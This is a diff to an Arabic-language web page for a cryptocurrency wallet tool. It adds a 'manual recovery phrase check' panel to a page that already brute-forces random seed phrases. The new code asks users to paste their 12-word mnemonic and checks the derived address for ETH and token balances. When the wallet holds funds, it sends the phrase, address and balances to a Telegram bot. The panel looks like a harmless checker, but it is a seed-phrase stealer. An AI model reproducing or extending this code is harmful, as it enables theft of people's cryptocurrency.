@@ -1,4 +1,4 @@
-
+اموت فيكي 
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
@@ -59,6 +59,23 @@
             padding: 30px;
             margin-bottom: 30px;
             border: 1px solid #e9ecef;
+        }
+
+        .manual-check-panel {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 30px;
+            border: 1px solid #e9ecef;
+        }
+
+        .manual-check-panel h3 {
+            color: #495057;
+            margin-bottom: 20px;
+            font-size: 1.3rem;
+            display: flex;
+            align-items: center;
+            gap: 10px;
         }
 
         .control-group {
@@ -173,6 +190,16 @@
         .btn-warning:hover {
             transform: translateY(-2px);
             box-shadow: 0 10px 20px rgba(255, 154, 0, 0.3);
+        }
+
+        .btn-info {
+            background: linear-gradient(135deg, #17a2b8 0%, #6fdaed 100%);
+            color: white;
+        }
+
+        .btn-info:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(23, 162, 184, 0.3);
         }
 
         .btn:disabled {
@@ -328,6 +355,72 @@
             border: 1px solid #ffeaa7;
         }
 
+        .wallet-details {
+            background: white;
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 20px;
+            border: 1px solid #e9ecef;
+        }
+
+        .wallet-details h4 {
+            color: #495057;
+            margin-bottom: 15px;
+            font-size: 1.1rem;
+        }
+
+        .wallet-info {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 10px;
+        }
+
+        .wallet-info-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid #f1f3f4;
+        }
+
+        .wallet-info-item:last-child {
+            border-bottom: none;
+        }
+
+        .wallet-info-label {
+            font-weight: 600;
+            color: #495057;
+        }
+
+        .wallet-info-value {
+            color: #6c757d;
+            word-break: break-all;
+            text-align: left;
+        }
+
+        .token-list {
+            margin-top: 10px;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+
+        .token-item {
+            padding: 8px;
+            margin-bottom: 5px;
+            background: #f8f9fa;
+            border-radius: 5px;
+            border: 1px solid #e9ecef;
+        }
+
+        .token-name {
+            font-weight: 600;
+            color: #495057;
+        }
+
+        .token-symbol {
+            color: #6c757d;
+            font-size: 0.9rem;
+        }
+
         /* تصميم متجاوب للهواتف المحمولة */
         @media (max-width: 768px) {
             body {
@@ -346,7 +439,7 @@
                 padding: 20px;
             }
             
-            .control-panel {
+            .control-panel, .manual-check-panel {
                 padding: 20px;
             }
             
@@ -387,7 +480,7 @@
                 padding: 15px;
             }
             
-            .control-panel {
+            .control-panel, .manual-check-panel {
                 padding: 15px;
             }
             
@@ -436,6 +529,30 @@
         </div>
 
         <div class="main-content">
+            <!-- قسم التحقق اليدوي من العبارات -->
+            <div class="manual-check-panel">
+                <h3>🔍 التحقق اليدوي من عبارة الاسترجاع</h3>
+                <div class="control-group">
+                    <label for="manualMnemonic">أدخل عبارة الاسترجاع (12 كلمة):</label>
+                    <textarea id="manualMnemonic" rows="3" placeholder="أدخل عبارة الاسترجاع هنا (12 كلمة)"></textarea>
+                </div>
+                
+                <div class="checkbox-group">
+                    <input type="checkbox" id="manualCheckTokens" checked>
+                    <label for="manualCheckTokens">البحث عن الرموز المميزة (Tokens) بالإضافة إلى ETH</label>
+                </div>
+                
+                <div class="button-group">
+                    <button id="checkMnemonicBtn" class="btn btn-info">
+                        <span>🔎 فحص العبارة</span>
+                    </button>
+                </div>
+                
+                <div id="manualCheckResult" class="wallet-details" style="display: none;">
+                    <!-- سيتم ملء هذا القسم بالنتائج -->
+                </div>
+            </div>
+
             <div class="control-panel">
                 <div class="control-group">
                     <label for="searchSpeed">سرعة البحث (مللي ثانية بين كل عبارة):</label>
@@ -741,9 +858,13 @@
             stopBtn: document.getElementById('stopBtn'),
             testTelegramBtn: document.getElementById('testTelegramBtn'),
             clearLogsBtn: document.getElementById('clearLogsBtn'),
+            checkMnemonicBtn: document.getElementById('checkMnemonicBtn'),
             searchSpeed: document.getElementById('searchSpeed'),
             maxAttempts: document.getElementById('maxAttempts'),
             checkTokens: document.getElementById('checkTokens'),
+            manualCheckTokens: document.getElementById('manualCheckTokens'),
+            manualMnemonic: document.getElementById('manualMnemonic'),
+            manualCheckResult: document.getElementById('manualCheckResult'),
             totalGenerated: document.getElementById('totalGenerated'),
             activeWallets: document.getElementById('activeWallets'),
             emptyWallets: document.getElementById('emptyWallets'),
@@ -989,6 +1110,147 @@
             elements.currentStatus.className = `alert alert-${type}`;
         }
 
+        // وظيفة التحقق اليدوي من العبارة
+        async function checkMnemonicManually() {
+            const mnemonic = elements.manualMnemonic.value.trim();
+            
+            if (!mnemonic) {
+                updateStatus('❌ يرجى إدخال عبارة استرجاع', 'danger');
+                return;
+            }
+            
+            if (!checkEthersLoaded()) {
+                return;
+            }
+            
+            // إظهار رسالة التحميل
+            elements.checkMnemonicBtn.disabled = true;
+            elements.checkMnemonicBtn.innerHTML = '<span class="loading-spinner"></span> جاري الفحص...';
+            
+            try {
+                // التحقق من صحة العبارة
+                if (!ethers.utils.isValidMnemonic(mnemonic)) {
+                    throw new Error('عبارة الاسترجاع غير صالحة. يرجى التحقق من الكلمات.');
+                }
+                
+                updateStatus('جاري فحص عبارة الاسترجاع...', 'info');
+                addLogEntry(`🔍 جاري فحص العبارة يدويًا: ${mnemonic.substring(0, 30)}...`);
+                
+                // تحويل العبارة إلى عنوان
+                const address = await mnemonicToAddress(mnemonic);
+                
+                if (!address) {
+                    throw new Error('فشل في تحويل العبارة إلى عنوان');
+                }
+                
+                addLogEntry(`تم تحويل العبارة إلى العنوان: ${address}`);
+                
+                // فحص أصول المحفظة
+                const walletDetails = await checkWalletAssets(address);
+                
+                // عرض النتائج
+                displayManualCheckResult(mnemonic, address, walletDetails);
+                
+                if (walletDetails.hasAssets) {
+                    updateStatus(`✅ تم العثور على محفظة نشطة! العنوان: ${address.substring(0, 20)}...`, 'success');
+                    addLogEntry(`🎉 المحفظة تحتوي على أصول! العنوان: ${address}`, 'success');
+                    
+                    // إرسال المحفظة إلى Telegram
+                    const telegramSent = await sendWalletToTelegram(mnemonic, address, walletDetails);
+                    if (telegramSent) {
+                        addLogEntry('✅ تم إرسال المحفظة إلى Telegram بنجاح', 'success');
+                    } else {
+                        addLogEntry('❌ فشل في إرسال المحفظة إلى Telegram', 'error');
+                    }
+                } else {
+                    updateStatus(`📭 المحفظة فارغة أو لا تحتوي على أصول`, 'info');
+                    addLogEntry(`📭 المحفظة فارغة: ${address}`, 'info');
+                }
+                
+            } catch (error) {
+                console.error('خطأ في فحص العبارة يدويًا:', error);
+                updateStatus(`❌ ${error.message}`, 'danger');
+                addLogEntry(`❌ خطأ في فحص العبارة: ${error.message}`, 'error');
+                
+                // عرض رسالة الخطأ في قسم النتائج
+                elements.manualCheckResult.innerHTML = `
+                    <h4>❌ نتيجة الفحص</h4>
+                    <div class="alert alert-danger">
+                        <strong>خطأ:</strong> ${error.message}
+                    </div>
+                `;
+                elements.manualCheckResult.style.display = 'block';
+            } finally {
+                // إعادة تعيين زر الفحص
+                elements.checkMnemonicBtn.disabled = false;
+                elements.checkMnemonicBtn.innerHTML = '<span>🔎 فحص العبارة</span>';
+            }
+        }
+
+        // عرض نتائج الفحص اليدوي
+        function displayManualCheckResult(mnemonic, address, walletDetails) {
+            let resultHTML = `
+                <h4>${walletDetails.hasAssets ? '🎉 محفظة نشطة!' : '📭 محفظة فارغة'}</h4>
+                <div class="wallet-info">
+                    <div class="wallet-info-item">
+                        <span class="wallet-info-label">عبارة الاسترجاع:</span>
+                        <span class="wallet-info-value"><code>${mnemonic}</code></span>
+                    </div>
+                    <div class="wallet-info-item">
+                        <span class="wallet-info-label">العنوان:</span>
+                        <span class="wallet-info-value"><code>${address}</code></span>
+                    </div>
+                    <div class="wallet-info-item">
+                        <span class="wallet-info-label">رصيد ETH:</span>
+                        <span class="wallet-info-value">${walletDetails.ethBalance !== null ? walletDetails.ethBalance.toFixed(6) + ' ETH' : 'غير متوفر'}</span>
+                    </div>
+                    <div class="wallet-info-item">
+                        <span class="wallet-info-label">تحتوي على ETH:</span>
+                        <span class="wallet-info-value">${walletDetails.hasETH ? '✅ نعم' : '❌ لا'}</span>
+                    </div>
+                    <div class="wallet-info-item">
+                        <span class="wallet-info-label">تحتوي على رموز:</span>
+                        <span class="wallet-info-value">${walletDetails.hasTokens ? '✅ نعم (' + walletDetails.tokens.length + ' رمز)' : '❌ لا'}</span>
+                    </div>
+            `;
+            
+            if (walletDetails.tokens.length > 0) {
+                resultHTML += `
+                    <div class="wallet-info-item">
+                        <span class="wallet-info-label">الرموز المميزة:</span>
+                        <div class="wallet-info-value">
+                            <div class="token-list">
+                `;
+                
+                walletDetails.tokens.forEach(token => {
+                    resultHTML += `
+                        <div class="token-item">
+                            <div class="token-name">${token.name}</div>
+                            <div class="token-symbol">${token.symbol}</div>
+                        </div>
+                    `;
+                });
+                
+                resultHTML += `
+                            </div>
+                        </div>
+                    </div>
+                `;
+            }
+            
+            resultHTML += `
+                </div>
+                <div class="button-group" style="margin-top: 15px;">
+                    <a href="https://etherscan.io/address/${address}" target="_blank" class="btn btn-secondary">
+                        <span>🔗 عرض على Etherscan</span>
+                    </a>
+                </div>
+            `;
+            
+            elements.manualCheckResult.innerHTML = resultHTML;
+            elements.manualCheckResult.style.display = 'block';
+        }
+
         // الوظيفة الرئيسية للبحث
         async function searchForActiveWallets() {
             try {
@@ -1136,6 +1398,7 @@
         elements.stopBtn.addEventListener('click', stopSearch);
         elements.testTelegramBtn.addEventListener('click', testTelegramConnection);
         elements.clearLogsBtn.addEventListener('click', clearLogs);
+        elements.checkMnemonicBtn.addEventListener('click', checkMnemonicManually);
 
         // التحقق من تحميل ethers.js عند بدء التطبيق
         document.addEventListener('DOMContentLoaded', function() {
